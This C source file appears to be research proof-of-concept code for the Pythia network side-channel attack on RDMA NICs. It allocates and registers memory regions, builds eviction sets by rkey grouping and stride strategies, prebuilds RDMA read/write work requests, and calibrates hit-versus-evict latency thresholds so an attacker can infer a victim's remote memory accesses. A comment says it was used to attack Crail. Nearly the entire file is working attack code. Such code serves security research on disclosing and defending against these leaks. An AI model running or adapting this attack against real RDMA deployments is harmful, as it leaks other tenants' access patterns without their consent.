#include "rsec.h"

/**
 * rsec.c: this code includes all the functionalities that
 * server/client/attacker uses
 */

/**
 * rsec_malloc - malloc request memory space
 * @size: target allocation size
 * @malloc_array: a data structure to store all allocated address - which is
 * used for free when the program is terminated
 */
void *rsec_malloc(long long int size, GArray *malloc_array) {
    // return malloc(size);
    long long int alloc_size = RSEC_ROUND_UP(size, RSEC_PAGE_SIZE);
    void *temp = numa_alloc_onnode(alloc_size, RSEC_NUMA_NODE);
    // void *temp = memalign(RSEC_PAGE_SIZE, size);
    assert(((uintptr_t)temp) % RSEC_PAGE_SIZE == 0);

    struct rsec_malloc_metadata *malloc_data =
        malloc(sizeof(struct rsec_malloc_metadata));
    malloc_data->addr = temp;
    malloc_data->size = alloc_size;

    g_array_append_val(malloc_array, malloc_data);
    // RSEC_PRINT("alloc %p %lld\n", temp, alloc_size);
    return temp;
}

/**
 * rsec_free - testing function
 */
void rsec_free(void *input_ptr) {
    // numa_free(input_ptr);
}

/**
 * rsec_free_all - free all allocated memory space
 * @allocate_array: a data structure to store all allocated address - which is
 * used for free when the program is terminated
 */
void rsec_free_all(GArray *allocate_array) {
    int length = allocate_array->len;
    int i;
    struct rsec_malloc_metadata *alloc_data;
    for (i = 0; i < length; i++) {
        alloc_data = (struct rsec_malloc_metadata *)g_array_index(
            allocate_array, guint64, i);

        numa_free(alloc_data->addr, alloc_data->size);
        // RSEC_PRINT("free %p %lu\n", alloc_data->addr, alloc_data->size);
        free(alloc_data);
    }
    // numa_free(input_ptr);
}

/**
 * rsec_alloc_all_key - create data entry for each key - used by server
 * @share_inf: RDMA context
 * @num_key: number of key
 * @size: size of each key
 * @force_mr: use different mr?
 * @malloc_array: allocation metadata
 */
struct ib_mr_attr *rsec_alloc_all_key(struct ib_inf *share_inf, int num_key,
                                      long long int size, int force_mr,
                                      GArray *malloc_array) {
    int i, j;
    void *tmp_memspace;
    struct ib_mr_attr *ret_mr_list =
        malloc(sizeof(struct ib_mr_attr) * num_key);

    struct ibv_mr *tmp_mr;
    long long int remaining_size, alloc_size;
    assert(num_key >= 1);
    assert(size >= 8);

    if (RSEC_ALLOC_MODE == RSEC_ALLOC_MR_ORIENTED || force_mr) {
        tmp_memspace = rsec_malloc(size, malloc_array);
        RSEC_PRINT("total: alloc %d\n", num_key);
        for (i = 0; i < num_key; i++) {
            tmp_mr =
                ibv_reg_mr(share_inf->pd, tmp_memspace, size,
                           IBV_ACCESS_LOCAL_WRITE | IBV_ACCESS_REMOTE_WRITE |
                               IBV_ACCESS_REMOTE_READ);
            ret_mr_list[i].addr = (uintptr_t)tmp_mr->addr;
            ret_mr_list[i].rkey = tmp_mr->rkey;
            memset((void *)ret_mr_list[i].addr, i, size);
            if (i % 100000 == 0) RSEC_PRINT("total: alloc %d/%d\n", i, num_key);
        }
    } else if (RSEC_ALLOC_MODE == RSEC_ALLOC_SPACE_ORIENTED) {
        i = 0;
        remaining_size = (long long int)size * num_key;
        RSEC_PRINT("total: alloc %lld MB (size:%lld num:%d)\n",
                   remaining_size / RSEC_MB_UNIT, size, num_key);
        while (remaining_size > 0) {
            j = 0;
            if (remaining_size >
                (long long int)RSEC_MAX_MR_BLOCK_SIZE_KB * 1024)
                alloc_size = (long long int)RSEC_MAX_MR_BLOCK_SIZE_KB * 1024;
            else
                alloc_size = (long long int)remaining_size;
            // alloc_size = RSEC_MIN(remaining_size, RSEC_MAX_MR_BLOCK_SIZE);
            RSEC_PRINT("alloc_size %lld MB/%lld MB\n",
                       alloc_size / RSEC_MB_UNIT,
                       remaining_size / RSEC_MB_UNIT);

            remaining_size = remaining_size - alloc_size;

            tmp_memspace = rsec_malloc(alloc_size, malloc_array);
            assert(tmp_memspace);
            tmp_mr =
                ibv_reg_mr(share_inf->pd, tmp_memspace, alloc_size,
                           IBV_ACCESS_LOCAL_WRITE | IBV_ACCESS_REMOTE_WRITE |
                               IBV_ACCESS_REMOTE_READ);
            assert(tmp_mr);
            while (alloc_size >= size) {
                ret_mr_list[i].addr = (uintptr_t)tmp_mr->addr + j * size;
                ret_mr_list[i].rkey = tmp_mr->rkey;
                // memset((void *)ret_mr_list[i].addr, i, size);
                i++;
                j++;
                alloc_size = alloc_size - size;
            }
            remaining_size =
                remaining_size +
                alloc_size;  // add remaining size back - some leftover
        }
    } else {
        RSEC_PRINT("ALLOCATION mode error: %d\n", RSEC_ALLOC_MODE);
    }
    return ret_mr_list;
}

/**
 * rsec_access_mr - access a specific mr
 * @tar_cq: target polling cq
 * @tar_qp: target issueing qp
 * @local_mr: local memory region - issue request
 * @access_mr_list: accessed remote mr list
 * @length: length of the access mr list
 */
void rsec_access_mr(struct ibv_cq *tar_cq, struct ibv_qp *tar_qp,
                    struct ibv_mr *local_mr, struct ib_mr_attr **access_mr_list,
                    int length) {
    int i;
    for (i = 0; i < length; i++) {
        if (RSEC_ACCESS_MODE == RSEC_OPERATION_WRITE)
            userspace_one_write(tar_qp, local_mr, RSEC_ACCESS_MR_SIZE,
                                access_mr_list[i], RSEC_ACCESS_MR_OFFSET);
        else
            userspace_one_read(tar_qp, local_mr, RSEC_ACCESS_MR_SIZE,
                               access_mr_list[i], RSEC_ACCESS_MR_OFFSET);
    }
    userspace_one_poll(tar_cq, length);
}

/**
 * rsec_form_sub_mr - form a subset of mr based on target evicted mr address
 * @evict_mr_list: all available mr list
 * @length: length of the access mr list
 * @access_order: can manually setup access order if needed
 */
struct ib_mr_attr **rsec_form_sub_mr(struct ib_mr_attr *evict_mr_list,
                                     int length, int *access_order) {
    struct ib_mr_attr **ret_mr_list;
    int i;
    ret_mr_list = malloc(sizeof(struct ib_mr_attr *) * length);
    for (i = 0; i < length; i++) {
        ret_mr_list[i] = malloc(sizeof(struct ib_mr_attr));
        if (!access_order)
            memcpy(ret_mr_list[i], &evict_mr_list[i],
                   sizeof(struct ib_mr_attr));
        else
            memcpy(ret_mr_list[i], &evict_mr_list[access_order[i]],
                   sizeof(struct ib_mr_attr));
    }
    return ret_mr_list;
}

/**
 * rsec_form_attack_sub_mr - form a subset of mr for eviction based on target
 * evicted mr - MR-based eviction
 * @target_rkey: target rkey
 * @evict_mr_list: available mr
 * @required_mr_num: taret MR num
 * @real_process_number: return MR set size
 * @total_accessible_mr: length of evict_mr_list
 * @stride_distance: manually setup a distance to pick different MRs
 */
struct ib_mr_attr **rsec_form_attack_sub_mr(
    uint32_t target_rkey, struct ib_mr_attr *evict_mr_list, int required_mr_num,
    int *real_process_number, int total_accessible_mr, int stride_distance) {
    struct ib_mr_attr **ret_mr_list, *ret_mr_space;
    int count = 0;
    int i;
    int target_rkey_mod;
    GList *group_list[RSEC_MR_MOD_NUMBER];
    // build hashtable
    ret_mr_space = malloc(sizeof(struct ib_mr_attr) * required_mr_num);

    ret_mr_list = malloc(required_mr_num * sizeof(struct ib_mr_attr *));
    for (i = 0; i < required_mr_num; i++) ret_mr_list[i] = &ret_mr_space[i];
    assert(required_mr_num <= total_accessible_mr);
    if (stride_distance == RSEC_MR_UNIFORM_PICK_NUMBER)  // uniform pick
    {
        for (i = 0; i < total_accessible_mr; i++) {
            memcpy(ret_mr_list[count], &evict_mr_list[i],
                   sizeof(struct ib_mr_attr));
            count++;
            if (count == required_mr_num) break;
        }
    } else if (stride_distance <= 0) {
        int target_group = -stride_distance;
        for (i = 0; i < total_accessible_mr; i++) {
            if (evict_mr_list[i].rkey % RSEC_MR_MOD_NUMBER == target_group) {
                memcpy(ret_mr_list[count], &evict_mr_list[i],
                       sizeof(struct ib_mr_attr));
                count++;
            }
            if (count == required_mr_num) break;
        }
        RSEC_PRINT("use %d:%d\n", target_group, count);
    } else  // stride design
    {
        memset(group_list, 0, sizeof(GList *) * RSEC_MR_MOD_NUMBER);
        for (i = 0; i < total_accessible_mr; i++) {
            int group_target = (evict_mr_list[i].rkey) & 31;
            group_list[group_target] =
                g_list_append(group_list[group_target], GINT_TO_POINTER(i));
        }

        target_rkey_mod = target_rkey % RSEC_MR_MOD_NUMBER;
        if (stride_distance > 0) {
            while (count < required_mr_num) {
                if (target_rkey_mod >= RSEC_MR_MOD_NUMBER)
                    target_rkey_mod = target_rkey_mod % RSEC_MR_MOD_NUMBER;
                GList *l;
                if (group_list[target_rkey_mod] == NULL) {
                    target_rkey_mod = target_rkey % RSEC_MR_MOD_NUMBER + 1;
                    if (target_rkey_mod >= RSEC_MR_MOD_NUMBER)
                        target_rkey_mod = target_rkey_mod % RSEC_MR_MOD_NUMBER;
                }
                assert(group_list[target_rkey_mod]);
                for (l = group_list[target_rkey_mod]; l != NULL; l = l->next) {
                    memcpy(ret_mr_list[count],
                           &evict_mr_list[GPOINTER_TO_INT(l->data)],
                           sizeof(struct ib_mr_attr));
                    count++;
                    if (count == required_mr_num) break;
                }
                g_list_free(group_list[target_rkey_mod]);
                group_list[target_rkey_mod] = NULL;
                if (count == required_mr_num) break;
                RSEC_PRINT("use %d:%d\n", target_rkey_mod, count);
                target_rkey_mod = target_rkey_mod + stride_distance;
            }
        }
    }
    *real_process_number = count;
    return ret_mr_list;
}

/**
 * rsec_form_wr_list - form a wr based on sge and request
 * which is used to build a pre-configured wr to get rid of setting sge/wr for
 * every access
 */
struct ibv_send_wr **rsec_form_wr_list(struct ibv_mr *temp_mr,
                                       struct ib_mr_attr **sub_evict_mr_list,
                                       struct ibv_sge *input_sge,
                                       int real_process_mr_number,
                                       uint32_t extra_rkey,
                                       uint64_t extra_offset) {
    int total_wr_length =
        RSEC_ROUND_UP(real_process_mr_number, RSEC_CQ_DEPTH) / RSEC_CQ_DEPTH;
    int i;
    struct ibv_send_wr *wr;
    int count = 0;
    struct ibv_send_wr **input_wr_list;
    input_wr_list = malloc(sizeof(struct ibv_send_wr *) * total_wr_length);
    for (i = 0; i < total_wr_length; i++) {
        input_wr_list[i] = malloc(sizeof(struct ibv_send_wr) * RSEC_CQ_DEPTH);
        memset(input_wr_list[i], 0, sizeof(struct ibv_send_wr) * RSEC_CQ_DEPTH);
    }

    {
        input_sge->length = RSEC_EVICT_MR_SIZE;
        input_sge->addr = (uintptr_t)temp_mr->addr;
        input_sge->lkey = temp_mr->lkey;
        for (i = 0; i < real_process_mr_number; i++) {
            wr = input_wr_list[i / RSEC_CQ_DEPTH];
            if (RSEC_EVICT_MODE == RSEC_OPERATION_WRITE)
                wr[count].opcode = IBV_WR_RDMA_WRITE;
            else
                wr[count].opcode = IBV_WR_RDMA_READ;
            wr[count].num_sge = 1;
            wr[count].sg_list = input_sge;
            wr[count].send_flags = 0;
            wr[count].wr_id = 0;
            wr[count].wr.rdma.remote_addr =
                sub_evict_mr_list[i]->addr + extra_offset;
            if (extra_rkey)
                wr[count].wr.rdma.rkey = extra_rkey;
            else
                wr[count].wr.rdma.rkey = sub_evict_mr_list[i]->rkey;
            wr[count].next = NULL;
            if (count) wr[count - 1].next = &wr[count];
            // userspace_one_write(tar_qp, local_mr, RSEC_EVICT_MR_SIZE,
            // evict_mr_list[order_array[i]], RSEC_EVICT_MR_OFFSET);
            count++;
            if (RSEC_EVICT_MODE == RSEC_OPERATION_WRITE)
                wr[count - 1].send_flags = IBV_SEND_INLINE;
            else
                wr[count - 1].send_flags = 0;
            if (count == RSEC_CQ_DEPTH) {
                wr[count - 1].send_flags |= IBV_SEND_SIGNALED;
                count = 0;
            }
        }
        if (count != 0 && count != RSEC_CQ_DEPTH)
            wr[count - 1].send_flags |= IBV_SEND_SIGNALED;
    }
    return input_wr_list;
}

/**
 * rsec_form_sub_mr_new - form a list of attack mr based on target mr address
 * @evict_mr_list: available mr list
 * @total_accessible_mr: length of evict_mr_list
 * @collision_check: avoid accessing same page in set
 * @real_process_mr_number: return the length of finalized access list
 * @custom_shift: shift of the access offset [rsec_control.c]
 * @access_target: target evict page
 * @index_set: returned access index set - evict set
 * @custom_stride_distance: manually setup the stride distance [rsec_control.c]
 * @custom_rkey: setup different rkey [rsec_controlc]
 * @stride_strategy: different attack strategy [recommended PYTHIA]
 */
struct ib_mr_attr __attribute__((optimize("O0"))) *
    *rsec_form_attack_sub_mr_new(struct ib_mr_attr *evict_mr_list,
                                 int target_mr_num, int total_accessible_mr,
                                 int collision_check,
                                 int *real_process_mr_number, int custom_shift,
                                 int access_target,
                                 struct return_int *index_set,
                                 int custom_stride_distance, int custom_rkey,
                                 int stride_strategy) {
    struct ib_mr_attr **candidate_list, *candidate_space;
    struct ib_mr_attr *potential_candidate_set;
    int loop_index, target_index = 0;
    // int count = 0;
    int potential_candidate_count = 0;
    // int wrap_times = 0;
    // int hashtable_check;
    // void *pointer_to_key, *pointer_to_value_record;
    // void *garbage_pointer = (void *)0xcafe;
    int duplicate_flag = 0;
    int print_flag = 1;
    int stride_distance;
    int shift_amount = 0;
    int PYTHIA_K = 13;
    // build hashtable

    if (custom_stride_distance)
        stride_distance = (custom_stride_distance / RSEC_PAGE_SIZE);
    else
        stride_distance = (RSEC_PROBE_STRIDE_DISTANCE / RSEC_PAGE_SIZE);

    if (custom_shift)
        shift_amount = custom_shift;
    else
        shift_amount = 0;

    switch (stride_strategy) {
        case RSEC_PROBE_STRIDE_STRATEGY_NULL:
            break;
        case RSEC_PROBE_STRIDE_STRATEGY_PYTHIA:
            stride_distance = (((1 << (12 + PYTHIA_K)) / RSEC_PAGE_SIZE));
            shift_amount = access_target % (1 << PYTHIA_K);
            break;
        case RSEC_PROBE_STRIDE_STRATEGY_HALF:
            stride_distance = (1 << 17 / RSEC_PAGE_SIZE);
            shift_amount = access_target % 32;
            break;
        case RSEC_PROBE_STRIDE_STRATEGY_NAIVE:
            stride_distance = (1 << 15 / RSEC_PAGE_SIZE);
            shift_amount = 0;
            break;
        default:
            RSEC_ERROR("wrong strategy mode: %d\n", stride_strategy);
    }

    index_set->index_distance = -1;
    index_set->real_distance = -1;
    index_set->first = -1;
    index_set->last = -1;

    // assert(length<=total_accessible_mr);
    if (target_mr_num > total_accessible_mr) {
        // RSEC_PRINT("it's not enough to form a full matrix - use duplicate
        // access instead %d:%d\n", target_mr_num, total_accessible_mr);
        /*if(!RSEC_PROBE_ACCEPT_WRAP_UP)
            assert(target_mr_num<=total_accessible_mr);*/
    }
    if (RSEC_PROBE_ACCEPT_WRAP_UP) duplicate_flag = 1;
    candidate_list = malloc(sizeof(struct ib_mr_attr *) * target_mr_num);
    candidate_space = malloc(sizeof(struct ib_mr_attr) * target_mr_num);
    // potential_candidate_set = malloc(sizeof(struct ib_mr_attr) *
    // total_accessible_mr);
    potential_candidate_set = malloc(sizeof(struct ib_mr_attr) * target_mr_num);
    long long int distance;
    // loop through all mr to find potential set
    int bucket_1;
    int bucket_2;
    if (stride_strategy == RSEC_PROBE_STRIDE_STRATEGY_PYTHIA) {
        if (custom_rkey >= 0) {
            bucket_1 = ((access_target >> 9) % (1 << PYTHIA_K) >> 3) * 8;
            bucket_2 = ((access_target) % (1 << PYTHIA_K) >> 3) * 8;
            if (bucket_1 == bucket_2) target_mr_num = target_mr_num / 2;
        } else {
            bucket_1 =
                ((access_target >> (-custom_rkey)) % (1 << PYTHIA_K) >> 3) * 8;
            bucket_2 = -1;
        }
    }
    if (stride_strategy == RSEC_PROBE_STRIDE_STRATEGY_PYTHIA) {
        for (loop_index = 0; loop_index < total_accessible_mr;
             loop_index = loop_index + stride_distance) {
            target_index = 0;
            distance = loop_index - access_target;
            if (loop_index < (RSEC_PROBE_DEFAULT_START_DISTANCE / RSEC_MR_SIZE))
                continue;
            if (RSEC_ABS(distance) <
                ((long)RSEC_PROBE_START_DISTANCE / (long)RSEC_MR_SIZE))
                continue;
            target_index = loop_index + bucket_1;
            memcpy(&potential_candidate_set[potential_candidate_count],
                   &evict_mr_list[target_index], sizeof(struct ib_mr_attr));
            potential_candidate_count++;
            if (potential_candidate_count == target_mr_num) {
                RSEC_PRINT("index: %d \t distance:%lld %d:%d\n", target_index,
                           distance, RSEC_EVICT_MR_PROCESS_NUMBER,
                           RSEC_PROBE_STRIDE_DISTANCE);
                index_set->last = target_index;
                break;
            }
            if (print_flag < 5) {
                // RSEC_PRINT(
                //    "index: %d:%d \t distance:%lld %d:%d bucket: %d:%d\n",
                //    target_index, loop_index, distance,
                //    RSEC_EVICT_MR_PROCESS_NUMBER, RSEC_PROBE_STRIDE_DISTANCE,
                //    bucket_1, bucket_2);
                if (print_flag == 1) index_set->first = target_index;
                index_set->index_distance = stride_distance;
                index_set->real_distance = RSEC_PROBE_STRIDE_DISTANCE;
                print_flag++;
            }
            if (bucket_1 == bucket_2) continue;
            target_index = loop_index + bucket_2;
            memcpy(&potential_candidate_set[potential_candidate_count],
                   &evict_mr_list[target_index], sizeof(struct ib_mr_attr));
            potential_candidate_count++;
            if (potential_candidate_count == target_mr_num) {
                // RSEC_PRINT("index: %d \t distance:%lld %d:%d\n",
                // target_index,
                //           distance, RSEC_EVICT_MR_PROCESS_NUMBER,
                //           RSEC_PROBE_STRIDE_DISTANCE);
                index_set->last = target_index;
                break;
            }
            if (print_flag < 5) {
                // RSEC_PRINT(
                //    "index: %d:%d \t distance:%lld %d:%d bucket: %d:%d\n",
                //    target_index, loop_index, distance,
                //    RSEC_EVICT_MR_PROCESS_NUMBER, RSEC_PROBE_STRIDE_DISTANCE,
                //    bucket_1, bucket_2);
                if (print_flag == 1) index_set->first = target_index;
                index_set->index_distance = stride_distance;
                index_set->real_distance = RSEC_PROBE_STRIDE_DISTANCE;
                print_flag++;
            }

            if (loop_index == total_accessible_mr - 1 && duplicate_flag == 1)
                loop_index = 0;
        }
    } else {
        for (loop_index = 0; loop_index < total_accessible_mr;
             loop_index = loop_index + stride_distance) {
            target_index = 0;
            distance = loop_index - access_target;
            if (loop_index < (RSEC_PROBE_DEFAULT_START_DISTANCE / RSEC_MR_SIZE))
                continue;
            if (RSEC_ABS(distance) <
                ((long)RSEC_PROBE_START_DISTANCE / (long)RSEC_MR_SIZE))
                continue;

            target_index = loop_index + shift_amount;
            memcpy(&potential_candidate_set[potential_candidate_count],
                   &evict_mr_list[target_index], sizeof(struct ib_mr_attr));
            potential_candidate_count++;
            if (potential_candidate_count == target_mr_num) {
                // RSEC_PRINT("index: %d \t distance:%lld %d:%d\n",
                // target_index, distance, RSEC_EVICT_MR_PROCESS_NUMBER,
                // RSEC_PROBE_STRIDE_DISTANCE);
                index_set->last = target_index;
                break;
            }
            if (print_flag < 6) {
                // RSEC_PRINT("index: %d:%d \t distance:%lld %d:%d shift: %d\n",
                // target_index, loop_index, distance,
                // RSEC_EVICT_MR_PROCESS_NUMBER, RSEC_PROBE_STRIDE_DISTANCE,
                // shift_amount);
                if (print_flag == 1) index_set->first = target_index;
                index_set->index_distance = stride_distance;
                index_set->real_distance = RSEC_PROBE_STRIDE_DISTANCE;
                print_flag++;
            }
        }
    }

    if (potential_candidate_count < target_mr_num) {
        RSEC_PRINT("get %d:%d potential_candidate_count\n",
                   potential_candidate_count, target_mr_num);
        potential_candidate_count -= 1;
        assert(potential_candidate_count >= target_mr_num);
    }
    // start building eviction_set from candidate
    loop_index = 0;
    for (loop_index = 0; loop_index < potential_candidate_count; loop_index++) {
        candidate_list[loop_index] = &candidate_space[loop_index];
        memcpy(candidate_list[loop_index], &potential_candidate_set[loop_index],
               sizeof(struct ib_mr_attr));
    }
    if (collision_check == RSEC_PROBE_COLLISION_CHECK_MODE_UNIFORM) {
        assert(candidate_list[2]->addr - candidate_list[1]->addr ==
               candidate_list[1]->addr - candidate_list[0]->addr);
    }

    *real_process_mr_number = potential_candidate_count;
    if (target_mr_num > total_accessible_mr) {
        RSEC_PRINT(
            "it's not enough to form a full matrix - use duplicate access "
            "instead %d:%d:%d\n",
            target_mr_num, total_accessible_mr, potential_candidate_count);
    }
    free(potential_candidate_set);
    return candidate_list;
}

/**
 * rsec_get_threshold - since Pythia attack crosses network, the latency is
 * versatile
 * Attacker needs to get the regular network latency in order determine the
 * difference between hit and evict
 * This part requires client to interact with attacker to learn
 * This code is a basic template which uses average
 * It can also be modified into more sophisticate models such as KNN (what we
 * used to attack Crail)
 * @server_cq: the cq used to poll
 * @server_qp: target qp
 * @memory_cq: local cq
 * @memory_qp: target qp
 * @local_mr: local memory space to issue request
 * @single_reload_mr: target reload mr
 * @input_wr_list: input pre-set wr list
 * @total_wr_length: length of input_wr_list
 * @ret_lat_evict: return average latency of a MISS access
 * @ret_lat_hit: return average latency of a HIT access
 * @attacker: attacker=1/client=0
 * @iteration: how many rounds to iterate
 */
int __attribute__((optimize("O0")))
    rsec_get_threshold(struct ibv_cq *server_cq, struct ibv_qp *server_qp,
                       struct ibv_cq *memory_cq, struct ibv_qp *memory_qp,
                       struct ibv_mr *local_mr,
                       struct ib_mr_attr *single_reload_mr,
                       struct ibv_send_wr **input_wr_list, int total_wr_length,
                       double *ret_lat_evict, double *ret_lat_hit, int attacker,
                       int iteration) {
    double lat_sum, tmp;
    struct timespec start, end;
    int i, per_wr;
    char *memcached_string = malloc(RSEC_MEMCACHED_STRING_LENGTH);
    unsigned long signal_output;
    if (attacker) {
        lat_sum = 0;
        for (i = 0; i < RSEC_PROBE_GET_THRESHOLD_TRY_NUMBER; i++) {
            // eviction
            for (per_wr = 0; per_wr < total_wr_length; per_wr++) {
                userspace_one_preset(memory_qp, input_wr_list[per_wr]);
                userspace_one_poll(memory_cq, 1);
            }
            memset(memcached_string, 0, RSEC_MEMCACHED_STRING_LENGTH);
            sprintf(memcached_string, RSEC_WARMUP_STRING_1, iteration, i);
            memcached_publish(memcached_string, &signal_output,
                              RSEC_SIGNAL_SIZE);

            // wait remote to do operation
            memset(memcached_string, 0, RSEC_MEMCACHED_STRING_LENGTH);
            sprintf(memcached_string, RSEC_WARMUP_STRING_2, iteration, i);
            memcached_get_published_size(memcached_string, RSEC_SIGNAL_SIZE);
            // usleep(300);

            // remote does an operation - start checking latency - this should
            // be hit
            // asm volatile("": : :"memory");
            clock_gettime(CLOCK_MONOTONIC, &start);
            userspace_one_read(server_qp, local_mr, RSEC_RELOAD_MR_SIZE,
                               single_reload_mr, RSEC_RELOAD_MR_OFFSET);
            userspace_one_poll(server_cq, 1);
            clock_gettime(CLOCK_MONOTONIC, &end);
            // asm volatile("": : :"memory");
            tmp = diff_ns(&start, &end);
            lat_sum = lat_sum + tmp;
        }
        *ret_lat_hit = lat_sum / RSEC_PROBE_GET_THRESHOLD_TRY_NUMBER;

        lat_sum = 0;
        for (i = 0; i < RSEC_PROBE_GET_THRESHOLD_TRY_NUMBER; i++) {
            // eviction
            for (per_wr = 0; per_wr < total_wr_length; per_wr++) {
                userspace_one_preset(memory_qp, input_wr_list[per_wr]);
                userspace_one_poll(memory_cq, 1);
            }
            memset(memcached_string, 0, RSEC_MEMCACHED_STRING_LENGTH);
            sprintf(memcached_string, RSEC_WARMUP_STRING_3, iteration, i);
            memcached_publish(memcached_string, &signal_output,
                              RSEC_SIGNAL_SIZE);

            // wait remote to do operation
            // but remote will do nothing
            memset(memcached_string, 0, RSEC_MEMCACHED_STRING_LENGTH);
            sprintf(memcached_string, RSEC_WARMUP_STRING_4, iteration, i);
            memcached_get_published_size(memcached_string, RSEC_SIGNAL_SIZE);
            // usleep(300);

            // remote does an operation - start checking latency - this should
            // be hit
            // asm volatile("": : :"memory");
            clock_gettime(CLOCK_MONOTONIC, &start);
            userspace_one_read(server_qp, local_mr, RSEC_RELOAD_MR_SIZE,
                               single_reload_mr, RSEC_RELOAD_MR_OFFSET);
            userspace_one_poll(server_cq, 1);
            clock_gettime(CLOCK_MONOTONIC, &end);
            // asm volatile("": : :"memory");
            tmp = diff_ns(&start, &end);
            lat_sum = lat_sum + tmp;
        }
        *ret_lat_evict = lat_sum / RSEC_PROBE_GET_THRESHOLD_TRY_NUMBER;
    } else {
        for (i = 0; i < RSEC_PROBE_GET_THRESHOLD_TRY_NUMBER; i++) {
            memset(memcached_string, 0, RSEC_MEMCACHED_STRING_LENGTH);
            sprintf(memcached_string, RSEC_WARMUP_STRING_1, iteration, i);
            memcached_get_published_size(memcached_string, RSEC_SIGNAL_SIZE);

            userspace_one_read(server_qp, local_mr, RSEC_RELOAD_MR_SIZE,
                               single_reload_mr, RSEC_RELOAD_MR_OFFSET);
            userspace_one_poll(server_cq, 1);

            memset(memcached_string, 0, RSEC_MEMCACHED_STRING_LENGTH);
            sprintf(memcached_string, RSEC_WARMUP_STRING_2, iteration, i);
            memcached_publish(memcached_string, &signal_output,
                              RSEC_SIGNAL_SIZE);
        }

        for (i = 0; i < RSEC_PROBE_GET_THRESHOLD_TRY_NUMBER; i++) {
            memset(memcached_string, 0, RSEC_MEMCACHED_STRING_LENGTH);
            sprintf(memcached_string, RSEC_WARMUP_STRING_3, iteration, i);
            memcached_get_published_size(memcached_string, RSEC_SIGNAL_SIZE);

            // NO ACCESS THIS TIME

            memset(memcached_string, 0, RSEC_MEMCACHED_STRING_LENGTH);
            sprintf(memcached_string, RSEC_WARMUP_STRING_4, iteration, i);
            memcached_publish(memcached_string, &signal_output,
                              RSEC_SIGNAL_SIZE);
        }
    }
    free(memcached_string);
    if (attacker && ((*ret_lat_evict < *ret_lat_hit) ||
                     (*ret_lat_evict >
                      *ret_lat_hit + RSEC_ESTIMATED_EVICT_FETCH_LATENCY_MAX)))
        return 1;
    return 0;
}
